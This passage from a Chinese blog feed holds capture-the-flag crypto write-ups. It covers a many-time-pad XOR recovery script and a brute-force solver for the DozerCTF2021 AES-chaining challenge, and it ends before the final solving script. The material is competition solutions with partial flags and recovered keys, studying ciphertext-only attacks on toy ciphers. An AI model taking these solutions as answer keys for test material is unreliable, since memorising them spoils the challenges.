<p>主要就是两个密文异或，可以把相同的key去掉，这样就相当于两个明文异或了<br>（这里注意尽管OTP的安全系数相当高，但是由于密码分发的问题，难以实现，所以这里当成MTP来做了）</p>
<p>至于攻击的手段，时间有限先不展开；有了脚本之后，并不代表一切的终结，我们还需要做一下操作</p>
<h3 id="脚本改编"><a href="#脚本改编" class="headerlink" title="脚本改编"></a>脚本改编</h3><p>首先当然是把读文件里的文件名换一下啦，注意最好删去逗号</p>
<p>然后直接运行会报错，因为密文不等长，可以先把第六和第十二个密文填充和其他密文等长的长度</p>
<p>第一次运行结果是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N=w -ou need to u&#125;e the k3</span><br><span class="line">o%n 2lag as the kky of On8</span><br><span class="line"> im1 Pad Encryptgn. Now )</span><br><span class="line">h3t -ou have passkd the p/</span><br><span class="line">e$io!s RSA test, zhis cha1</span><br><span class="line">l7ng1 is not partgcularly</span><br><span class="line">p&gt;ea&#x27;e get the tr&#123;e messa:</span><br><span class="line">d;ff=cult for you  It is 7</span><br><span class="line">u!t &#x27;imple encrypzion.I h2</span><br><span class="line">p7 y;u can solve zhis pro?</span><br><span class="line">l7m %uickly and gkt the c2</span><br><span class="line">r ec  answer succksslyp@d</span><br><span class="line">b&#x27;f&gt;ag/it_1s_P@dd1nQ@nd_p@d &#x27;</span><br></pre></td></tr></table></figure>

<p>（？？？小朋友你是不是有很多问号）</p>
<p>为什么会出现乱码和明文混合的现象呢，这个要和攻击的原理挂钩，暂时也不展开</p>
<p>而我们所要做的第二步就是愉快的猜字母环节，将很明显错地方的字母给替换成对的，替换的函数师傅已经写好了，直接用就好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">know</span>(<span class="params">p_index, p_pos, ch</span>):</span></span><br><span class="line">    msg[p_index, p_pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != p_index:</span><br><span class="line">            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要手动更改的就是这个地方，按照意思，替换你确定的字母</span></span><br><span class="line">know(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">4</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">13</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">17</span>, <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">19</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">1</span>, <span class="number">25</span>, <span class="string">&#x27;e&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>最后运行得到完整的明文和flag，至于之前的在末尾填充0，也是试出来</p>
<p>贴一下完整脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ischr</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">infer</span>(<span class="params">p_index, p_pos</span>):</span></span><br><span class="line">    <span class="keyword">if</span> msg[p_index, p_pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[p_index, p_pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != p_index:</span><br><span class="line">            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_space</span>():</span></span><br><span class="line">    <span class="keyword">for</span> t_index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x != y]</span><br><span class="line">        f = <span class="keyword">lambda</span> t_pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(ischr, [s[t_pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(t_pos) <span class="keyword">for</span> t_pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> t_pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(t_pos), t_index, t_pos))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第十二行和第六行长度不一，末尾填充0就好了</span></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;t3mpt.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">get_space()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">know</span>(<span class="params">p_index, p_pos, ch</span>):</span></span><br><span class="line">    msg[p_index, p_pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != p_index:</span><br><span class="line">            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要手动更改的就是这个地方，按照意思，替换你确定的字母</span></span><br><span class="line">know(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">4</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">13</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">17</span>, <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">19</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">1</span>, <span class="number">25</span>, <span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其实只需要知道一条正确的明文就够了，key=C1^M1</span></span><br><span class="line">key = xo.strxor(c[<span class="number">0</span>], <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> msg[<span class="number">0</span>]]).encode())</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我也不知道为什么抄别人的还要写WP，另外找到一个py2的脚本，但是看不懂，他那个好像可以是密文不等长的，先贴一下链接，后续再研究<br><a href="https://lazzzaro.github.io/2020/11/07/crypto-%E6%B5%81%E5%AF%86%E7%A0%81/">https://lazzzaro.github.io/2020/11/07/crypto-%E6%B5%81%E5%AF%86%E7%A0%81/</a></p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>OTP一次一密</tag>
      </tags>
  </entry>
  <entry>
    <title>20210529 2021DozerCTFCrypto方向部分WP</title>
    <url>/posts/67700515/</url>
    <content><![CDATA[<p>就做出一题。。。</p>
<span id="more"></span>

<h1 id="DozerCTF2021"><a href="#DozerCTF2021" class="headerlink" title="DozerCTF2021"></a>DozerCTF2021</h1><h2 id="手滑的袁学长"><a href="#手滑的袁学长" class="headerlink" title="手滑的袁学长"></a>手滑的袁学长</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">answer = <span class="built_in">open</span>(<span class="string">&#x27;FLAG1/flag&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(answer))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Function_enc</span>(<span class="params">msg, key, p_2, c_2</span>):</span></span><br><span class="line">    msg = Padding.pad(msg, <span class="number">16</span>)</span><br><span class="line">    struct = [msg[i:i+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">    out = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> struct:</span><br><span class="line">        c = strxor(p, c_2)</span><br><span class="line">        c = AES.new(key, AES.MODE_ECB).encrypt(c)</span><br><span class="line"></span><br><span class="line">        out += strxor(p_2, c)</span><br><span class="line">        c_2 = c</span><br><span class="line">        p_2 = p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KEY = os.urandom(<span class="number">16</span>)</span><br><span class="line">msg = <span class="string">&#x27;I do not care the result&#x27;</span> + KEY.<span class="built_in">hex</span>()</span><br><span class="line">text = Function_enc(msg.encode(), KEY, answer[:<span class="number">16</span>], answer[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;key = &#x27;</span> + KEY.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cipher =&#x27;</span> + text.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>加密算法的大致思路如下，比较简单易懂</p>
<img alt="20210529 DozerCTF2021-bb5bf248.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DozerCTF2021-bb5bf248.png" width="" height="" >

<p>首先的思路是从后往前做，求出out3之后看看包不包含已知部分，核心思想还是Brute-force</p>
<h4 id="一个小插曲"><a href="#一个小插曲" class="headerlink" title="一个小插曲"></a>一个小插曲</h4><p>一开始以为思路跑偏了，因为袁学长删除的部分是hex之后的，就不是原理四部分组成的out了，但还是先记录下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># flag_length =</span></span><br><span class="line"></span><br><span class="line">hex_num = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================枚举key的============================ #</span></span><br><span class="line">key_hex = <span class="built_in">list</span>(<span class="string">&#x27;2$9cf037f8b3a$2b19b5bda978c294$5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">possible_key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hex_num:</span><br><span class="line">    key_hex[<span class="number">1</span>] = i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> hex_num:</span><br><span class="line">        key_hex[<span class="number">13</span>] = j</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> hex_num:</span><br><span class="line">            key_hex[-<span class="number">2</span>] = k</span><br><span class="line">            possible_key.append(<span class="string">&quot;&quot;</span>.join(key_hex))</span><br><span class="line"><span class="comment"># print(possible_key)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================枚举out的============================ #</span></span><br><span class="line">cipher_hex = <span class="string">&#x27;91e5fb43f053b21ce12e41df0b0ae0bb6a20c55719151$$fccecb4$$$$$2a27c8c582c6704f$$$$153bd3313b84235ace16a7b3b190$e487abfa9$cf379d1a3c&#x27;</span></span><br><span class="line">cipher_hex1 = <span class="string">&#x27;91e5fb43f053b21ce12e41df0b0ae0bb&#x27;</span></span><br><span class="line">cipher_hex2 = <span class="built_in">list</span>(<span class="string">&#x27;6a20c55719151$$fccecb4$$$$$2a27c&#x27;</span>)</span><br><span class="line">cipher_hex3 = <span class="built_in">list</span>(<span class="string">&#x27;8c582c6704f$$$$153bd3313b84235ac&#x27;</span>)</span><br><span class="line">cipher_hex4 = <span class="built_in">list</span>(<span class="string">&#x27;e16a7b3b190$e487abfa9$cf379d1a3c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">possible_cipher_hex4 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hex_num:</span><br><span class="line">    cipher_hex4[<span class="number">11</span>] = i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> hex_num:</span><br><span class="line">        cipher_hex4[<span class="number">21</span>] = j</span><br><span class="line">        possible_cipher_hex4.append(<span class="string">&quot;&quot;</span>.join(cipher_hex4))</span><br><span class="line"><span class="comment"># print(possible_cipher_hex4)</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;DozerCTF&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tmp_key <span class="keyword">in</span> possible_key:</span><br><span class="line">    <span class="comment"># key知道，msg就知道</span></span><br><span class="line">    msg = (<span class="string">&#x27;I do not care the result&#x27;</span> + tmp_key.encode().<span class="built_in">hex</span>()).encode()</span><br><span class="line">    msg = Padding.pad(msg, <span class="number">16</span>)</span><br><span class="line">    struct = [msg[i:i + <span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">16</span>)]</span><br><span class="line">    tmp_m2, tmp_m3, tmp_m4 = struct[<span class="number">1</span>], struct[<span class="number">2</span>], struct[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> tmp_out4 <span class="keyword">in</span> possible_cipher_hex4:</span><br><span class="line">        <span class="comment"># 第四次aes的结果解密</span></span><br><span class="line">        tmp_aes_c4 = strxor(number.long_to_bytes(<span class="built_in">int</span>(tmp_out4, <span class="number">16</span>)), tmp_m3)</span><br><span class="line">        tmp_aes_m4 = AES.new(tmp_key.encode(), AES.MODE_ECB).decrypt(tmp_aes_c4)</span><br><span class="line"></span><br><span class="line">        tmp_aes_c3 = strxor(tmp_m4, tmp_aes_m4)</span><br><span class="line">        tmp_out3 = strxor(tmp_aes_c3, tmp_m2)</span><br><span class="line">        tmp_out3 = tmp_out3.<span class="built_in">hex</span>()</span><br><span class="line">        <span class="keyword">if</span> tmp_out3.startswith(<span class="string">&#x27;8c582c6704f&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(tmp_out3)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<hr>
<p>但后来发现应该没有错，我们自己写了一个flag，然后进行加密，看out输出和hex之后的结果，截取其中的某一段进行hex的反操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># answer = b&#x27;DozerCTF&#123;yuan-xz-weism-yaoshhne&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">out =  <span class="string">b&#x27;\xafF/\xcaM\x1a\xcf\x9b%\x88T\x01\x8a\x1fKb\x04\x85\xd0\xd7\x8d\xb5\x16\xb6\xc5\xd2\xe1\x92\xff\xf3\xe6e\xe0A\x8f\xc5&#123;(GG&gt;\xbd\xff\xbc\xef\xef\xf0X@ .\xd6L\x08,\xa2H\xc3\x1a\xf4&#123;DQB&#x27;</span></span><br><span class="line">cipher = af462fca4d1acf9b258854018a1f4b620485d0d78db516b6c5d2e192fff3e665e0418fc57b2847473ebdffbcefeff05840202ed64c082ca248c31af47b445142</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;0485d0d78db516b6c5d2e192fff3e665&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(c, <span class="number">16</span>)))</span><br></pre></td></tr></table></figure>

<p>出来的结果是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;\x04\x85\xd0\xd7\x8d\xb5\x16\xb6\xc5\xd2\xe1\x92\xff\xf3\xe6e&#x27;</span></span><br></pre></td></tr></table></figure>

<p>显然结果是完全一样的，至于原理，应该是字节转数字的问题，这里不再深究<br><img alt="20210529 DozerCTF2021-98f6b60a.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DozerCTF2021-98f6b60a.png" width="" height="" ></p>
<p>所以思路的基础没有毛病</p>
<hr>
<p>然后，第二天，脑子清醒点的时候，我在检查中，发现aes的key有问题，之前代码里的key和题目中用来充当密钥的key不是一样的</p>
<p>我随机生成了一个key，并输出hex之后的结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;\xdb\x8dL+*\xf0?\x824oy\xf2cY\x95y&#x27;</span></span><br><span class="line"></span><br><span class="line">key_hex = db8d4c2b2af03f82346f79f263599579</span><br></pre></td></tr></table></figure>

<p>用之前的简单转回字节的方法</p>
<img alt="20210529 DozerCTF2021-ada5b99a.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DozerCTF2021-ada5b99a.png" width="" height="" >

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;db8d4c2b2af03f82346f79f263599579&#x27;</span>.encode())</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="string">&#x27;db8d4c2b2af03f82346f79f263599579&#x27;</span>, <span class="number">16</span>)))</span><br></pre></td></tr></table></figure>

<p>出来是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;db8d4c2b2af03f82346f79f263599579&#x27;</span></span><br></pre></td></tr></table></figure>

<p>破案啦，显然两个字节流并不一样，问题出在aes的key上</p>
<p>（可能是昨天做懵了）________Orz</p>
<p>然后用hex的反操作就可以逆回去，但不知道是不是幻觉，有几次也没有逆回去，但应该是哪里搞错了，所以学到另外一种hex的反操作</p>
<p>最终的操作如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">KEY = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key = &quot;</span>, KEY)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key_hex = &quot;</span>, KEY.<span class="built_in">hex</span>())</span><br><span class="line">key = KEY.<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;tmp_key = &quot;</span>, <span class="built_in">bytes</span>.fromhex(key))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(key, <span class="number">16</span>)))</span><br><span class="line"><span class="keyword">assert</span> KEY == <span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line"><span class="keyword">assert</span> KEY == long_to_bytes(<span class="built_in">int</span>(key, <span class="number">16</span>))</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key =  <span class="string">b&#x27;:\xa7\xb6G\x02m\x8f\xcc,n\xa6\xfcH\xea\xc44&#x27;</span></span><br><span class="line">key_hex =  3aa7b647026d8fcc2c6ea6fc48eac434</span><br><span class="line">tmp_key =  <span class="string">b&#x27;:\xa7\xb6G\x02m\x8f\xcc,n\xa6\xfcH\xea\xc44&#x27;</span></span><br><span class="line"><span class="string">b&#x27;:\xa7\xb6G\x02m\x8f\xcc,n\xa6\xfcH\xea\xc44&#x27;</span></span><br></pre></td></tr></table></figure>

<p>当然，有用到key的地方全部要修改</p>
<img alt="20210529 DozerCTF2021-dd7c5f37.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DozerCTF2021-dd7c5f37.png" width="" height="" >

<hr>
<h4 id="回归正轨"><a href="#回归正轨" class="headerlink" title="回归正轨"></a>回归正轨</h4><p>修改之后的脚本，在一百万次以内就跑出来了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag_length =</span></span><br><span class="line"></span><br><span class="line">hex_num = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================枚举key的============================ #</span></span><br><span class="line">key_hex = <span class="built_in">list</span>(<span class="string">&#x27;2$9cf037f8b3a$2b19b5bda978c294$5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">possible_key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hex_num:</span><br><span class="line">    key_hex[<span class="number">1</span>] = i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> hex_num:</span><br><span class="line">        key_hex[<span class="number">13</span>] = j</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> hex_num:</span><br><span class="line">            key_hex[-<span class="number">2</span>] = k</span><br><span class="line">            possible_key.append(<span class="string">&quot;&quot;</span>.join(key_hex))</span><br><span class="line"><span class="comment"># print(possible_key)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================枚举out的============================ #</span></span><br><span class="line">cipher_hex = <span class="string">&#x27;91e5fb43f053b21ce12e41df0b0ae0bb6a20c55719151$$fccecb4$$$$$2a27c8c582c6704f$$$$153bd3313b84235ace16a7b3b190$e487abfa9$cf379d1a3c&#x27;</span></span><br><span class="line">cipher_hex1 = <span class="string">&#x27;91e5fb43f053b21ce12e41df0b0ae0bb&#x27;</span></span><br><span class="line">cipher_hex2 = <span class="built_in">list</span>(<span class="string">&#x27;6a20c55719151$$fccecb4$$$$$2a27c&#x27;</span>)</span><br><span class="line">cipher_hex3 = <span class="built_in">list</span>(<span class="string">&#x27;8c582c6704f$$$$153bd3313b84235ac&#x27;</span>)</span><br><span class="line">cipher_hex4 = <span class="built_in">list</span>(<span class="string">&#x27;e16a7b3b190$e487abfa9$cf379d1a3c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">possible_cipher_hex4 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hex_num:</span><br><span class="line">    cipher_hex4[<span class="number">11</span>] = i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> hex_num:</span><br><span class="line">        cipher_hex4[<span class="number">21</span>] = j</span><br><span class="line">        possible_cipher_hex4.append(<span class="string">&quot;&quot;</span>.join(cipher_hex4))</span><br><span class="line"><span class="comment"># print(possible_cipher_hex4)</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;DozerCTF&#123;&#x27;</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> tmp_key <span class="keyword">in</span> possible_key:</span><br><span class="line">    <span class="comment"># key知道，msg就知道</span></span><br><span class="line">    msg = (<span class="string">&#x27;I do not care the result&#x27;</span> + tmp_key).encode()</span><br><span class="line">    msg = Padding.pad(msg, <span class="number">16</span>)</span><br><span class="line">    struct = [msg[i:i + <span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">16</span>)]</span><br><span class="line">    tmp_m2, tmp_m3, tmp_m4 = struct[<span class="number">1</span>], struct[<span class="number">2</span>], struct[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> tmp_out4 <span class="keyword">in</span> possible_cipher_hex4:</span><br><span class="line">        <span class="comment"># 第四次aes的结果解密</span></span><br><span class="line">        tmp_aes_c4 = strxor(<span class="built_in">bytes</span>.fromhex(tmp_out4), tmp_m3)</span><br><span class="line">        tmp_aes_m4 = AES.new(<span class="built_in">bytes</span>.fromhex(tmp_key), AES.MODE_ECB).decrypt(tmp_aes_c4)</span><br><span class="line"></span><br><span class="line">        tmp_aes_c3 = strxor(tmp_m4, tmp_aes_m4)</span><br><span class="line">        tmp_out3 = strxor(tmp_aes_c3, tmp_m2)</span><br><span class="line">        tmp_out3 = tmp_out3.<span class="built_in">hex</span>()</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(count)</span><br><span class="line">        <span class="keyword">if</span> tmp_out3.startswith(<span class="string">&#x27;8c582c6704f&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;key_hex =&quot;</span>, tmp_key)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;tmp_aes_m4 =&quot;</span>, tmp_aes_m4)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>跑出来是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key_hex = 279cf037f8b3a92b19b5bda978c294f5</span><br><span class="line">tmp_aes_m4 = <span class="string">b&#x27;\xde@=0N\xbf\x0c\xc0i\x82\x02x\xd6z\x0e\x93&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="最后一击"><a href="#最后一击" class="headerlink" title="最后一击"></a>最后一击</h4><p>什么都已经知道了，剩下的就是还原answer了，四步奏aes，只要一步一步走回去就好了</p>
<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><p>贴一下最后的解题脚本</p>
